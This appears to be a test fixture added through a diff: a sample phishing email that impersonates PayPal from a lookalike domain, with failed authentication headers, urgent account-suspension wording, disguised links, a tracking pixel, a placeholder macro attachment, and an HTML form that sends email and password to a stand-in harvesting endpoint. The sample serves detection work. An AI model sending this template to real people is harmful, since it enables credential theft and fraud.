@@ -1,0 +1,63 @@
+From: "PayPal Security" <security@paypa1-secure.com>
+Reply-To: phisher@evil-domain.xyz
+To: victim@company.com
+Subject: URGENT: Your PayPal Account Has Been Suspended - Immediate Action Required
+Date: Mon, 10 Feb 2025 03:22:00 +0300
+Message-ID: <xyz789@paypa1-secure.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="phishboundary"
+Return-Path: <bounce@evil-domain.xyz>
+Authentication-Results: mx.company.com; spf=fail smtp.mailfrom=paypa1-secure.com; dkim=fail header.d=paypa1-secure.com; dmarc=fail header.from=paypa1-secure.com
+Received: from mail.evil-domain.xyz (unknown [185.220.101.34]) by mx.company.com with SMTP; Mon, 10 Feb 2025 03:22:15 +0300
+Received: from localhost ([45.155.205.233]) by mail.evil-domain.xyz with SMTP; Mon, 10 Feb 2025 03:22:10 +0300
+X-Mailer: PHPMailer 5.2.28
+
+--phishboundary
+Content-Type: text/plain; charset="utf-8"
+
+Dear Valued Customer,
+
+We have detected unusual activity on your PayPal account. Your account has been temporarily suspended due to unauthorized access attempts.
+
+URGENT: You must verify your identity within 24 hours or your account will be permanently closed.
+
+Click here to verify your account: http://paypa1-secure.com/verify?id=victim
+Alternative link: https://bit.ly/3xFakeLink
+Direct login: http://192.168.55.123/paypal-login
+
+If you do not confirm your identity immediately, we will have no choice but to close your account and forfeit any remaining balance.
+
+PayPal Security Team
+
+--phishboundary
+Content-Type: text/html; charset="utf-8"
+
+<html>
+<body style="font-family: Arial;">
+<div style="color: white; font-size: 0px; display: none;">This is hidden tracking text xyzabc</div>
+<img src="https://paypa1-secure.com/track.gif" width="1" height="1">
+<h2>Dear Valued Customer,</h2>
+<p>We have detected <strong>unusual activity</strong> on your PayPal account. Your account has been <span style="color:red">temporarily suspended</span> due to unauthorized access attempts.</p>
+<p><strong>URGENT: You must verify your identity within 24 hours</strong> or your account will be permanently closed.</p>
+<p><a href="http://paypa1-secure.com/verify?id=victim">Click Here to Verify Your Account</a></p>
+<p><a href="https://bit.ly/3xFakeLink">Alternative Verification Link</a></p>
+<form action="http://paypa1-secure.com/harvest" method="POST">
+<input type="text" name="email" placeholder="Email">
+<input type="password" name="password" placeholder="Password">
+<button type="submit">Verify</button>
+</form>
+<script>document.title = "PayPal Security";</script>
+<p>PayPal Security Team</p>
+</body>
+</html>
+
+--phishboundary
+Content-Type: application/vnd.ms-excel; name="invoice_details.xlsm"
+Content-Disposition: attachment; filename="invoice_details.xlsm"
+Content-Transfer-Encoding: base64
+
+VGhpcyBpcyBhIGZha2UgbWFjcm8gZmlsZSBmb3IgdGVzdGluZy4gSXQgY29udGFpbnMgVkJB
+IG1hcmtlcnMgbGlrZSBBdXRvX09wZW4gYW5kIFN1YiBNb2R1bGUxIHRvIHRyaWdnZXIgbWFj
+cm8gZGV0ZWN0aW9uLg==
+
+--phishboundary--
